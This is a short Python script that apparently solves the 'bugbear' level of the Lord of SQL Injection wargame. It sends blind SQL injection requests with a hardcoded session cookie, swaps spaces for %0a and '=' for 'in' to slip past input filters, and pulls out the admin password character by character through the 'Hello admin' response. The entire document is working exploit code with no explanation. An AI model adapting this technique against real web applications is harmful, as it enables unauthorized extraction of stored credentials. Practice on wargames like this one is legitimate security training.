import requests
import re


cookie = {'PHPSESSID': 'hldutc71r5b68a3e2nvveko752'}

url = 'https://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no=-1'

cmp = "Hello admin"

passchars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'


dbname= ""

#Password is
for i in range(1, 10):
    for j in passchars:
        query = url + '%0a||%0a(id%0ain%0a("admin")%0a%26%26%0amid(pw,'+str(i)+',1)%0ain%0a("'+j+'")'+')--%0a'
        req = requests.get(query, cookies=cookie)
        res=req.text
        tmp = re.findall(cmp, res)
        if tmp:
            dbname += j
            break
print "Password is : " + dbname
        